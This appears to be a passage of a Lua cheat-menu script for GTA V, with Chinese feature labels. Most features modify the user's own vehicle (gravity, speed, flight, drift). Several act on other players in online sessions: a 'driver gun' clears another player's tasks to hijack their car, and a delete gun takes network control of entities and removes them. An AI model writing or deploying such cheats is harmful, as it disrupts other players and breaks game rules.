            dir:transformRotToDir()
            dir = dir*v3(30,30,30)
            pos1 = pos1 + dir
            dir = dir*v3(60,60,60)
            pos2 = pos2 + dir
            gameplay.shoot_single_bullet_between_coords(pos1,pos2, 1, -1312131151, my_ped, false, false, 2000)
            c.wait(0)
            return HANDLER_CONTINUE
          end
        end
    Settings["yanhuaqiang3"] = false
end)

firework_gun.on = Settings["yanhuaqiang3"]

firework_gun = menu.add_feature("信号枪","toggle",wuqi111.id,function(a)
        while a.on do
          Settings["yanhuaqiang1"] = true
            local me=player.player_id()
            local my_ped=player.get_player_ped(me)
            c.wait(0)
            while ped.is_ped_shooting(my_ped) do
            local pos1=player.get_player_coords(me)
            local pos2 = player.get_player_coords(me)
            dir = cam.get_gameplay_cam_rot()
            dir:transformRotToDir()
            dir = dir*v3(30,30,30)
            pos1 = pos1 + dir
            dir = dir*v3(60,60,60)
            pos2 = pos2 + dir
            gameplay.shoot_single_bullet_between_coords(pos1,pos2, 1, 1198879012, my_ped, false, false, 2000)
            c.wait(0)
            return HANDLER_CONTINUE
          end
        end
    Settings["yanhuaqiang1"] = false
end)

firework_gun.on = Settings["yanhuaqiang1"]

function fuck_NPC_car(veh)
entity.set_entity_coords_no_offset(veh,v3(0,0,0))
ped.set_ped_health(veh,0)
system.yield(0)
local me=player.player_id()
local my_ped=player.get_player_ped(me)
YUZHOUSHENCROSS.on=true
local veh=player.get_entity_player_is_aiming_at(me)
local hash=entity.get_entity_model_hash(veh)
if streaming.is_model_a_vehicle(hash) then
ped.set_ped_into_vehicle(my_ped,veh,-1)
YUZHOUSHENCROSS.on=false
elseif streaming.is_model_a_ped(hash) then
fuck_NPC_car(player.get_entity_player_is_aiming_at(me))
end
end
	
function fuck_Player_car(veh)
ped.clear_ped_tasks_immediately(veh)
system.yield(0)
local me=player.player_id()
local my_ped=player.get_player_ped(me)
YUZHOUSHENCROSS.on=true
local veh=player.get_entity_player_is_aiming_at(me)
local hash=entity.get_entity_model_hash(veh)
if streaming.is_model_a_vehicle(hash) then
YUZHOUSHENCROSS.on=false
ped.set_ped_into_vehicle(my_ped,veh,-1)
elseif ped.is_ped_a_player(veh) then
fuck_Player_car(veh)
else
fuck_NPC_car(veh)
end
end

vehicle_driver_weapon = menu.add_feature("驾驶枪", "toggle",wuqi111.id, function(a)
    local hash = 0
    while a.on do
	Settings["zaijujiashiqiang"] = true
    system.yield(0)
    local me = player.player_id()
    local my_ped = player.get_player_ped(me)
    local veh = player.get_entity_player_is_aiming_at(me)
    local hash = entity.get_entity_model_hash(veh)
    local pos = player.get_player_coords(me)
    if ped.is_ped_shooting(my_ped) then
    if streaming.is_model_a_vehicle(hash) then
    ped.set_ped_into_vehicle(my_ped,veh,-1)
    elseif ped.is_ped_a_player(veh) then
    fuck_Player_car(veh)
    elseif streaming.is_model_a_ped(hash) and ped.is_ped_in_any_vehicle(veh) then
    fuck_NPC_car(veh)
end
    end
end
Settings["zaijujiashiqiang"] = false
end)
vehicle_driver_weapon.on = Settings["zaijujiashiqiang"]

delete_gun = menu.add_feature("删除枪", "toggle",wuqi111.id, function(f)
    while f.on do
        system.yield(0)
        local Entity = player.get_entity_player_is_aiming_at(player.player_id())
        network.request_control_of_entity(Entity)
        if ped.is_ped_shooting(player.get_player_ped(player.player_id()))
        and entity.is_an_entity(Entity) 
        and (not entity.is_entity_a_ped(Entity) or not ped.is_ped_a_player(Entity)) 
        and network.has_control_of_entity(Entity) then
            entity.set_entity_as_mission_entity(Entity, false, true)
            entity.delete_entity(Entity)
        end
    end
end)

delete_gun.on = Settings["delete_gun"]

preset = menu.add_feature("预设载具", "parent", a.vehicleset.id, function(feat)
end)

maxspeed = menu.add_feature("限速修改", "parent", a.vehicleset.id, function(feat)
end)

maxspeedv1 = menu.add_feature("V1", "action", maxspeed.id, function(k, pid)
	vehicle.modify_vehicle_top_speed(player.player_vehicle(), 30)
	menu.notify("Float 30")
end)

maxspeedv2 = menu.add_feature("V2", "action", maxspeed.id, function(k, pid)
	vehicle.modify_vehicle_top_speed(player.player_vehicle(), 70)
	menu.notify("Float 70")
end)

maxspeedv3 = menu.add_feature("V3", "action", maxspeed.id, function(k, pid)
	vehicle.modify_vehicle_top_speed(player.player_vehicle(), 120)
	menu.notify("Float 120")
end)

maxspeedv4 = menu.add_feature("V4", "action", maxspeed.id, function(k, pid)
	vehicle.modify_vehicle_top_speed(player.player_vehicle(), 200)
	menu.notify("Float 200")
end)

maxspeedv5 = menu.add_feature("V5", "action", maxspeed.id, function(k, pid)
	vehicle.modify_vehicle_top_speed(player.player_vehicle(), 300)
	menu.notify("Float 300")
end)

maxgear = menu.add_feature("挡位修改", "parent", a.vehicleset.id, function(feat)
end)

maxgear_1 = menu.add_feature("Gear 1", "action", maxgear.id, function(k, pid)
	vehicle.set_vehicle_max_gear(player.player_vehicle(),1)
	menu.notify("Done")
end)

maxgear_2 = menu.add_feature("Gear 2", "action", maxgear.id, function(k, pid)
	vehicle.set_vehicle_max_gear(player.player_vehicle(),2)
	menu.notify("Done")
end)

maxgear_3 = menu.add_feature("Gear 3", "action", maxgear.id, function(k, pid)
	vehicle.set_vehicle_max_gear(player.player_vehicle(),3)
	menu.notify("Done")
end)

maxgear_4 = menu.add_feature("Gear 4", "action", maxgear.id, function(k, pid)
	vehicle.set_vehicle_max_gear(player.player_vehicle(),4)
	menu.notify("Done")
end)

maxgear_5 = menu.add_feature("Gear 5", "action", maxgear.id, function(k, pid)
	vehicle.set_vehicle_max_gear(player.player_vehicle(),5)
	menu.notify("Done")
end)

maxgear_6 = menu.add_feature("Gear 6", "action", maxgear.id, function(k, pid)
	vehicle.set_vehicle_max_gear(player.player_vehicle(),6)
	menu.notify("Done")
end)

maxgear_7 = menu.add_feature("Gear 7", "action", maxgear.id, function(k, pid)
	vehicle.set_vehicle_max_gear(player.player_vehicle(),7)
	menu.notify("Done")
end)

maxgear_8 = menu.add_feature("Gear 8", "action", maxgear.id, function(k, pid)
	vehicle.set_vehicle_max_gear(player.player_vehicle(),8)
	menu.notify("Done")
end)

GravityModify = menu.add_feature("重力修改", "parent", a.vehicleset.id, function(feat)
end)

GravityModify_GET = menu.add_feature("获取当前载具重力值", "action", GravityModify.id, function(k, pid)
	if player.is_player_in_any_vehicle(c.me()) then
		GravityModify_GET_now = vehicle.get_vehicle_gravity_amount(player.player_vehicle())
		menu.notify(GravityModify_GET_now, "当前载具重力")
	else
		menu.notify("未在任何载具内")
	end
end)

GravityModify_0 = menu.add_feature("Gravity 0", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 0)
	menu.notify("Gravity 0")
end)

GravityModify_2 = menu.add_feature("Gravity 2", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 2)
	menu.notify("Gravity 2")
end)

GravityModify_5 = menu.add_feature("Gravity 5", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 5)
	menu.notify("Gravity 5")
end)

GravityModify_8 = menu.add_feature("Gravity 8", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 8)
	menu.notify("Gravity 8")
end)

GravityModify_Def9 = menu.add_feature("Gravity 9.8 Default", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 9.8)
	menu.notify("Gravity 9.8 Default")
end)

GravityModify_12 = menu.add_feature("Gravity 12", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 12)
	menu.notify("Gravity 12")
end)

GravityModify_15 = menu.add_feature("Gravity 15", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 15)
	menu.notify("Gravity 15")
end)

GravityModify_20 = menu.add_feature("Gravity 20", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 20)
	menu.notify("Gravity 20")
end)

GravityModify_40 = menu.add_feature("Gravity 40", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 40)
	menu.notify("Gravity 40")
end)

GravityModify_100 = menu.add_feature("Gravity 100", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 100)
	menu.notify("Gravity 100")
end)

GravityModify_200 = menu.add_feature("Gravity 200", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 200)
	menu.notify("Gravity 200")
end)

GravityModify_500 = menu.add_feature("Gravity 500", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 500)
	menu.notify("Gravity 500")
end)

GravityModify_1000 = menu.add_feature("Gravity 1000", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 1000)
	menu.notify("Gravity 1000")
end)

GravityModify_1500 = menu.add_feature("Gravity 1500", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 1500)
	menu.notify("Gravity 1500")
end)

GravityModify_3000 = menu.add_feature("Gravity 3000", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 3000)
	menu.notify("Gravity 3000")
end)

GravityModify_10000 = menu.add_feature("Gravity 10000", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 10000)
	menu.notify("Gravity 10000")
end)

GravityModify_100000 = menu.add_feature("Gravity 100000", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 100000)
	menu.notify("Gravity 100000")
end)

GravityModify_1000000 = menu.add_feature("Gravity 1000000", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 1000000)
	menu.notify("Gravity 1000000")
end)

GravityModify_10000000 = menu.add_feature("Gravity 10000000", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 10000000)
	menu.notify("Gravity 10000000")
end)

GravityModify_100000000 = menu.add_feature("Gravity 100000000", "action", GravityModify.id, function(k, pid)
	vehicle.set_vehicle_gravity_amount(player.player_vehicle(), 100000000)
	menu.notify("Gravity 100000000")
end)

ghostcarcr = menu.add_feature("恶灵骑士摩托","action",preset.id,function(k, pid)
    car = spawn_vehicle(1491277511,player.get_player_coords(c.me()),0)
    entity.set_entity_god_mode(car,true)
    nuts = object.create_object(1793667637, player.get_player_coords(c.me()), true, false)
    entity.attach_entity_to_entity(nuts, car, 0, v3(0,0.0,0),v3(0,0,0), true, true, false, 0, true)			   
    local titlle = "scr_martin1"
    local hashid = "scr_sol1_plane_engine_fire"
    graphics.set_next_ptfx_asset(titlle)
    while not graphics.has_named_ptfx_asset_loaded(titlle) do
        graphics.request_named_ptfx_asset(titlle)
        c.wait(0)
    end
    graphics.start_ptfx_looped_on_entity(hashid, nuts, v3(0,0.1,-0.3), v3(180, 0, 0),0.5)
    c.wait(500)
    ped.set_ped_into_vehicle(player.get_player_ped(c.me()),car,-1)
end)

ghostcar = menu.add_feature("11","toggle",a.vehicleset.id,function(feat, pid)
    while feat.on do
        local titlle = "weap_xs_vehicle_weapons"
        local hashid = "muz_xs_turret_flamethrower_looping"
        graphics.set_next_ptfx_asset(titlle)
        while not graphics.has_named_ptfx_asset_loaded(titlle) do
            graphics.request_named_ptfx_asset(titlle)
            c.wait(0)
        end
        graphics.start_ptfx_looped_on_entity(hashid, car, v3(0,1,0.5), v3(0, 0, 0),4)
        c.wait(50)
    end
    feat.on = false
    graphics.remove_ptfx_from_entity(car)
end)
ghostcar.hidden = true

preset1 = menu.add_feature("糖的专属车", "action", preset.id, function(k, pid)
	hash = 1447690049
	car = spawn_vehicle(hash, player.get_player_coords(c.me()), 0, false, false)
	vehicle.set_vehicle_bulletproof_tires(car, true)
	vehicle.set_vehicle_number_plate_text(car, "2TAKE1")
	vehicle.set_vehicle_number_plate_index(car, 1)
	vehicle.is_vehicle_engine_running(car)
	vehicle.is_vehicle_on_all_wheels(car)
	vehicle.modify_vehicle_top_speed(car, 30) --226 Km/h
	vehicle.set_vehicle_max_gear(car,1)
	ped.set_ped_into_vehicle(player.get_player_ped(c.me()), car, -1)
end)

local gs_driftMinSpeed = 8.0
local gs_driftMaxAngle = 50.0
local ControlVehicleAccelerate = 71
local ControlVehicleBrake = 72
local ControlVehicleDuck = 73
local ControlVehicleSelectNextWeapon = 99
local ControlVehicleMoveUpOnly = 61
local INPUT_FRONTEND_LS = 209
local DriftActivateKeyboard = INPUT_FRONTEND_LS

local function asDegrees(angle)
    return angle * (180.0 / 3.14159265357); 
end

local function wrap360(val) 

    while (val < 0.0) do
        val = val + 360.0
    end
    while (val > 360.0) do
        val = val - 360.0
    end
    return val
end

local function getCurrentVehicle() 
	local player_id = player.player_id()
	local player_ped = player.get_player_ped(player_id)
    local player_vehicle = 0
    if (ped.is_ped_in_any_vehicle(player_ped)) then
        veh = ped.get_vehicle_ped_is_using(player_ped)
        if (network.has_control_of_entity(veh)) then
            player_vehicle = veh
        end
    end
    return player_vehicle
end


local function getHeadingOfTravel(veh) 
    local velocity = entity.get_entity_velocity(veh)
    local x = velocity.x
    local y = velocity.y
    local at2 = math.atan(y, x)
    return math.fmod(270.0 + math.deg(at2), 360.0)
end

local function slamDatBitch(veh, height) 
    if (vehicle.is_vehicle_on_all_wheels(veh) and not entity.is_entity_in_air(veh)) then
        entity.apply_force_to_entity(veh, 1,    0, 0, height,    0, 0, 0,   true, true)
    end
end

local isDrifting      = 0
local wasDrifting     = 0
local isDriftFinished = 1
local prevGripState   = 0
local lastDriftAngle  = 0.0
local oldGripState    = 0
local debug_notification = 0  
  
local function driftmod_ontick() 
    local player = player.player_id(); 
    local veh = getCurrentVehicle()
    local inVehicle   = veh ~= 0
    local isDriving   = true
    local mps = entity.get_entity_speed(veh)
    local mph       = mps * 2.23694
    local kmh       = mps * 3.6
    if inVehicle and isDriving and not isDrifting and not isDriftFinished then
        isDriftFinished = true
    end
    if not inVehicle or not isDriving then
        return
    end
    local driftKeyPressed = controls.is_control_pressed(2, ControlVehicleDuck) or controls.is_disabled_control_pressed(2, ControlVehicleDuck) or controls.is_control_pressed(0, DriftActivateKeyboard) or controls.is_disabled_control_pressed(0, DriftActivateKeyboard)
    if (driftKeyPressed and vehicle.get_vehicle_current_gear(veh) > 2) then
        vehicle.set_vehicle_current_gear(veh, 2)
        vehicle.set_vehicle_next_gear(veh, 2)
    end

    if driftKeyPressed then
        if (controls.get_control_normal(2, ControlVehicleBrake) > 0.1) then
            controls.set_control_normal(0, ControlVehicleBrake, 0)
            local neg = -0.3
            if (controls.is_control_pressed(2, ControlVehicleSelectNextWeapon)) then
                neg = 10
            end
            slamDatBitch(veh, neg * 1 * controls.get_control_normal(2, ControlVehicleBrake))
        end 
        local angleOfTravel  = getHeadingOfTravel(veh)
        local angleOfHeading = entity.get_entity_heading(veh)
        local driftAngle          = angleOfHeading - angleOfTravel
        if driftAngle and lastDriftAngle then
            local diff = driftAngle - lastDriftAngle

            if diff > 180.0 then
                driftAngle = driftAngle - 360.0
            end
            if diff < 180.0 then
                driftAngle = driftAngle - 360.0
            end
        end
        driftAngle    = wrap360(driftAngle)
        lastDriftAngle = driftAngle
        local czBasedDriftAngle = 360 - driftAngle
        if czBasedDriftAngle > 180 then
           czBasedDriftAngle = 0 - (360 - czBasedDriftAngle)
        end
        local done = false
        if ((isDrifting or kmh > gs_driftMinSpeed) and (math.abs(driftAngle - 360.0) < gs_driftMaxAngle) or (driftAngle < gs_driftMaxAngle)) then
            isDrifting      = 1
            isDriftFinished = 1;  
            if driftKeyPressed then
                if driftKeyPressed ~= oldGripState then
                    vehicle.set_vehicle_reduce_grip(veh, driftKeyPressed)
                    oldGripState = driftKeyPressed
                end
            end
            done = true
        end
        if not done and kmh < gs_driftMinSpeed then
            if driftKeyPressed then
                if driftKeyPressed ~= oldGripState then
                    vehicle.set_vehicle_reduce_grip(veh, driftKeyPressed)
                    oldGripState = driftKeyPressed
                end
            end
            done = true
        end
        if not done then
            if driftKeyPressed == oldGripState then
                vehicle.set_vehicle_reduce_grip(veh, false)
                oldGripState = 0
            end
            if math.abs(czBasedDriftAngle) > gs_driftMaxAngle then
                if czBasedDriftAngle > 0 then
                    vehicle.set_vehicle_indicator_lights(veh, 0, true)
                    vehicle.set_vehicle_indicator_lights(veh, 1, false)
                    vehicle.set_vehicle_steer_bias(veh, math.rad(czBasedDriftAngle * 0.69))
                else
                    vehicle.set_vehicle_indicator_lights(veh, 1, true)
                    vehicle.set_vehicle_indicator_lights(veh, 0, false)
                    vehicle.set_vehicle_steer_bias(veh, math.rad(czBasedDriftAngle * 0.69))
                end
            end
		else 
			vehicle.set_vehicle_indicator_lights(veh, 0, false)
			vehicle.set_vehicle_indicator_lights(veh, 1, false)
        end
    end
    if not driftKeyPressed and prevGripState then
        isDrifting      = 0
        isDriftFinished = 0
        lastDriftAngle = 0
        if driftKeyPressed ~= oldGripState then
            vehicle.set_vehicle_reduce_grip(veh, driftKeyPressed)
            oldGripState = driftKeyPressed
        end
    end
    prevGripState = driftKeyPressed
    if isDrifting ~= wasDrifting then
        wasDrifting     = isDrifting
        changedDrifting = true
    end
end

drift = menu.add_feature("漂移模式", "toggle", a.vehicleset.id, function(f)
    notify_above_map("按住Shift键进入漂移模式")
	while f.on do
		driftmod_ontick()
		system.yield(0)
	end
end)

function getped(pid)
	return player.get_player_ped(pid)
end
function getveh(pid)
	return player.get_player_vehicle(pid)
end
function getcoords(pid)
	return player.get_player_coords(pid)
end

veh_on_water=menu.add_feature("水上驾驶","toggle",a.vehicleset.id,function(a)
        while a.on and player.is_player_in_any_vehicle(player.player_id()) do
		Settings["veh_on_water"] = true
            system.yield(0)
            local dir=entity.get_entity_rotation(player.get_player_ped(player.player_id()))
            dir:transformRotToDir()
            if not water_obj then
                if requestmodel(110106994) then
                    water_obj=object.create_world_object(110106994,player.get_player_coords(player.player_id())+v3(0,0,5.25),false,true)
                    system.yield(0)
                    entity.set_entity_coords_no_offset(water_obj,v3(0,0,100))
                    system.yield(0)
                    entity.set_entity_visible(water_obj,false)
                end
            end
            if not water_obj3 then
                if requestmodel(110106994) then
                    water_obj3=object.create_world_object(110106994,player.get_player_coords(player.player_id())+v3(0,0,5.25),false,true)
                    system.yield(0)
                    entity.set_entity_coords_no_offset(water_obj3,v3(0,0,100))
                    system.yield(0)
                    entity.set_entity_visible(water_obj3,false)
                end
            end
            if not water_obj4 then
                if requestmodel(110106994) then
                    water_obj4=object.create_world_object(110106994,player.get_player_coords(player.player_id())+v3(0,0,5.25),false,true)
                    system.yield(0)
                    entity.set_entity_coords_no_offset(water_obj4,v3(0,0,100))
                    system.yield(0)
                    entity.set_entity_visible(water_obj4,false)
                end
            end
            if not water_obj2 then
                if requestmodel(3188223741) then
                    water_obj2=ped.create_ped(4,3188223741,player.get_player_coords(player.player_id())+v3(0,0,5.25),0,false,true)
                    system.yield(0)
                    entity.set_entity_god_mode(water_obj2,true)
                    system.yield(0)
                    entity.set_entity_visible(water_obj2,false)
                end
            end
            if water_obj2 then
                entity.set_entity_coords_no_offset(water_obj2,entity.get_entity_coords(player.get_player_vehicle(player.player_id()))-v3(0,0,3))
                system.yield(0)
                entity.set_entity_rotation(water_obj2,entity.get_entity_rotation(player.get_player_vehicle(player.player_id())))
            end
            if water_obj2 and entity.is_entity_in_water(water_obj2) then
                if water_obj then
                    entity.set_entity_coords_no_offset(water_obj,entity.get_entity_coords(player.get_player_vehicle(player.player_id()))-v3(0,0,0.5))
                end
                if water_obj3 then
                    entity.set_entity_coords_no_offset(water_obj3,entity.get_entity_coords(player.get_player_vehicle(player.player_id()))+v3(dir.x*90,dir.y*90,-1))
                end
                if water_obj4 then
                    entity.set_entity_coords_no_offset(water_obj4,entity.get_entity_coords(player.get_player_vehicle(player.player_id()))+v3(dir.x*180,dir.y*180,-1))
                end
            else
                return HANDLER_CONTINUE
            end
            if water_obj2 and entity.get_entity_model_hash(water_obj2)==0 then
                water_obj2=nil
                water_obj=nil
                water_obj3=nil
                water_obj4=nil
            end
        end
		Settings["veh_on_water"] = false
    end)

veh_on_water.on = Settings["veh_on_water"]

scs=1
ssr=255
ssg=0
ssb=0
smoke_colors = menu.add_feature("彩虹车轮烟色","toggle",a.vehicleset.id,function(k)
	local myped = player.get_player_ped(player.player_id())
	local color
	while k.on do
		if ped.is_ped_in_any_vehicle(myped) then
			local plyveh = player.get_player_vehicle(player.player_id())
				vehicle.set_vehicle_bulletproof_tires(plyveh,true)
			if plyveh ~= nil then
				network.request_control_of_entity(plyveh)
			end
			if scs==1 then
				if ssg > 255 then
					scs=2
					ssg=255
					vehicle.set_vehicle_tire_smoke_color(plyveh,ssr,ssg,ssb)
				else
					vehicle.set_vehicle_tire_smoke_color(plyveh,ssr,ssg,ssb)
					ssg=ssg+smoke_delay.value_i
				end
			elseif scs==2 then
				if ssr < 0 then
					scs=3
					ssr=0
					vehicle.set_vehicle_tire_smoke_color(plyveh,ssr,ssg,ssb)
				else
					vehicle.set_vehicle_tire_smoke_color(plyveh,ssr,ssg,ssb)
					ssr=ssr-smoke_delay.value_i
				end
			elseif scs==3 then
				if ssb > 255 then
					scs=4
					ssb=255
					vehicle.set_vehicle_tire_smoke_color(plyveh,ssr,ssg,ssb)
				else
					vehicle.set_vehicle_tire_smoke_color(plyveh,ssr,ssg,ssb)
					ssb=ssb+smoke_delay.value_i
				end
			elseif scs==4 then
				if ssg < 0 then
					scs=5
					ssg=0
					vehicle.set_vehicle_tire_smoke_color(plyveh,ssr,ssg,ssb)
				else
					vehicle.set_vehicle_tire_smoke_color(plyveh,ssr,ssg,ssb)
					ssg=ssg-smoke_delay.value_i
				end
			elseif scs==5 then
				if ssr > 255 then
					scs=6
					ssr=255
					vehicle.set_vehicle_tire_smoke_color(plyveh,ssr,ssg,ssb)
				else
					vehicle.set_vehicle_tire_smoke_color(plyveh,ssr,ssg,ssb)
					ssr=ssr+smoke_delay.value_i
				end
			elseif scs==6 then
				if ssb < 0 then
					scs=1
					ssb=0
					vehicle.set_vehicle_tire_smoke_color(plyveh,ssr,ssg,ssb)
				else
					vehicle.set_vehicle_tire_smoke_color(plyveh,ssr,ssg,ssb)
					ssb=ssb-smoke_delay.value_i
				end
			end
		end
		return HANDLER_CONTINUE
	end
	return HANDLER_POP
end)
smoke_colors.on = Settings["smoke_colors"]

smoke_delay = menu.add_feature("车轮烟雾彩虹速度","autoaction_value_i",a.vehicleset.id)

_U_vehicle_flier=menu.add_feature("载具飞行","slider",a.vehicleset.id,function(a)
        while a.on do
            system.yield(0)
            local me=player.player_id()
            local my_ped=player.get_player_ped(me)
            if player.is_player_in_any_vehicle(me) then
                local my_veh=player.get_player_vehicle(me)
                entity.set_entity_max_speed(my_veh,a.value)
                if controls.get_control_normal(0,32)==1.0 and controls.get_control_normal(0,34)==1.0 and controls.get_control_normal(0,33)==1.0 and controls.get_control_normal(0,35)==1.0 or controls.get_control_normal(0,34)==1.0 and controls.get_control_normal(0,35)==1.0 or controls.get_control_normal(0,32)==1.0 and controls.get_control_normal(0,33)==1.0 then
                    entity.set_entity_rotation(my_veh,cam.get_gameplay_cam_rot())
                    vehicle.set_vehicle_forward_speed(my_veh,0)
                elseif controls.get_control_normal(0,32)==1.0 and controls.get_control_normal(0,34)==1.0 and controls.get_control_normal(0,33)==1.0 then
                    entity.set_entity_rotation(my_veh,cam.get_gameplay_cam_rot())
                    vehicle.set_vehicle_forward_speed(my_veh,a.value)
                elseif  controls.get_control_normal(0,32)==1.0 and controls.get_control_normal(0,34)==1.0 then
                    entity.set_entity_rotation(my_veh,cam.get_gameplay_cam_rot()+v3(0,0,45))
                    vehicle.set_vehicle_forward_speed(my_veh,a.value)
                elseif controls.get_control_normal(0,32)==1.0 and controls.get_control_normal(0,35)==1.0 then 
                    entity.set_entity_rotation(my_veh,cam.get_gameplay_cam_rot()-v3(0,0,45))
                    vehicle.set_vehicle_forward_speed(my_veh,a.value)
                elseif controls.get_control_normal(0,33)==1.0 and controls.get_control_normal(0,35)==1.0 then
                    entity.set_entity_rotation(my_veh,cam.get_gameplay_cam_rot()-v3(0,0,135))
                    vehicle.set_vehicle_forward_speed(my_veh,a.value)
                elseif controls.get_control_normal(0,33)==1.0 and controls.get_control_normal(0,34)==1.0 then
                    entity.set_entity_rotation(my_veh,cam.get_gameplay_cam_rot()+v3(0,0,135))
                    vehicle.set_vehicle_forward_speed(my_veh,a.value)
                elseif controls.get_control_normal(0,33)==1.0 then
                    entity.set_entity_rotation(my_veh,cam.get_gameplay_cam_rot()-v3(0,0,180))
                    vehicle.set_vehicle_forward_speed(my_veh,a.value)
                elseif controls.get_control_normal(0,34)==1.0 then
                    entity.set_entity_rotation(my_veh,cam.get_gameplay_cam_rot()+v3(0,0,90))
                    vehicle.set_vehicle_forward_speed(my_veh,a.value)
                elseif controls.get_control_normal(0,35)==1.0 then
                    entity.set_entity_rotation(my_veh,cam.get_gameplay_cam_rot()-v3(0,0,90))
                    vehicle.set_vehicle_forward_speed(my_veh,a.value)
                elseif controls.get_control_normal(0,32)==1.0 then
                    vehicle.set_vehicle_forward_speed(my_veh,a.value)
                    entity.set_entity_rotation(my_veh,cam.get_gameplay_cam_rot())
                else
                    vehicle.set_vehicle_forward_speed(my_veh,0)
                    entity.set_entity_rotation(my_veh,cam.get_gameplay_cam_rot())

                end
                if controls.get_control_normal(0,21)==1.0 or controls.get_control_normal(0,143)==1.0 then
                    entity.set_entity_velocity(my_veh,v3(0,0,a.value))
                elseif controls.get_control_normal(0,132)==1.0 then
                    entity.set_entity_velocity(my_veh,v3(0,0,a.value*-1))
                end

            else
                set_vehicle_fixed(player.get_player_ped(player.player_id()))
            end
        end
    end)

_U_vehicle_flier.max,_U_vehicle_flier.min,_U_vehicle_flier.mod=1500,50,50

drive2waypoint = menu.add_feature("自动驾驶至标记点","value_str",a.vehicleset.id,function(feat)
        if feat.on then
            if ped.is_ped_in_any_vehicle(player.get_player_ped(player.player_id())) then
				local v2dest = ui.get_waypoint_coord()
				local v3dest = v3()
				v3dest.x, v3dest.y, v3dest.z = v2dest.x, v2dest.y, 10000
				local mepos = player.get_player_coords(player.player_id())
				local veh = player.get_player_vehicle(player.player_id())
				local distance = math.sqrt((mepos.x - v3dest.x) ^ 2 + (mepos.y - v3dest.y) ^ 2 + (mepos.z - v3dest.z) ^ 2)
				if feat.value == 0 then
				ai.task_vehicle_drive_to_coord_longrange(player.get_player_ped(player.player_id()), player.get_player_vehicle(player.player_id()),v3dest, autospd.value, 1 << 9 + 1 << 18 + 1 << 19, 0)
				elseif feat.value == 1 then
				ai.task_vehicle_drive_to_coord_longrange(player.get_player_ped(player.player_id()), player.get_player_vehicle(player.player_id()),v3dest, autospd.value, 1 << 1 + 1 << 8 + 1 << 0, 0)
				end
			else
				feat.on = false
            end
			c.wait(250)
            return HANDLER_CONTINUE
        else
			local seat = 1
			for i = -1, vehicle.get_vehicle_model_number_of_seats(entity.get_entity_model_hash(player.get_player_vehicle(player.player_id()))) - 2 do
				if vehicle.get_ped_in_vehicle_seat(player.get_player_vehicle(player.player_id()), i) == Ped then
					seat = i
				end
			end
			ped.clear_ped_tasks_immediately(player.get_player_ped(player.player_id()))
			ped.set_ped_into_vehicle(player.get_player_ped(player.player_id()), player.get_player_vehicle(player.player_id()), seat)
            return HANDLER_POP
		end
    end
):set_str_data({
  "暴躁",
  "正常"
})
autospd = menu.add_feature("驾驶速度", "action_slider", a.vehicleset.id, function(feat) 
end)
autospd.max = 200
autospd.min = 5
autospd.mod = 5
autospd.value = 5

firemk2= c.df("载具快速开火","toggle",a.vehicleset.id,function(feat,pid)
	if feat.on then
		Settings["zaijukuaisukaihuo"] = true
		local plyped = player.get_player_ped(c.me())
		local plyveh = player.get_player_vehicle(c.me())
		if plyveh ~= nil then
		network.request_control_of_entity(plyveh)
		end
		vehicle.set_vehicle_fixed(plyveh)
		vehicle.set_vehicle_deformation_fixed(plyveh)
	else
		Settings["zaijukuaisukaihuo"] = false
	end
return HANDLER_CONTINUE
end)

firemk2.on = Settings["zaijukuaisukaihuo"]

SpeedupMyVeh=menu.add_feature("自动加速","toggle",a.vehicleset.id,function(a)
        local state=0
        while a.on do
            system.yield(0)
            local me=player.player_id()
            local my_ped=player.get_player_ped(me)
            if ped.is_ped_in_any_vehicle(my_ped) then
                local veh=ped.get_vehicle_ped_is_using(my_ped)
                vehicle.set_vehicle_rocket_boost_active(veh,true)
            end
        end
    end)
SpeedupMyVeh.on = Settings["SpeedupMyVeh"]
	
U_veh_boost=menu.add_feature("载具加速瞬间充能","toggle",a.vehicleset.id,function(a)
Settings["Block_M2K"] = true
local state=0
while a.on do
system.yield(0)
local me=player.player_id()
local my_ped=player.get_player_ped(me)
if ped.is_ped_in_any_vehicle(my_ped) then
local veh=ped.get_vehicle_ped_is_using(my_ped)
vehicle.set_vehicle_rocket_boost_refill_time(veh,0)
end
end
Settings["Block_M2K"] = false
end)	
U_veh_boost.on = Settings["Block_M2K"]			
			
Block_M2K = menu.add_feature("火箭加速瞬间充能(MK2)", "toggle",a.vehicleset.id, function(feat)
Settings["Block_M2K"] = true
if feat.on then
local myped = player.get_player_ped(player.player_id())
if ped.is_ped_in_any_vehicle(myped) == true then
local Curveh = ped.get_vehicle_ped_is_using(myped)
vehicle.set_vehicle_rocket_boost_refill_time(Curveh, 0.000001)
end
return HANDLER_CONTINUE
end
Settings["Block_M2K"] = false
return HANDLER_POP
end)
Block_M2K.on = Settings["Block_M2K"]		

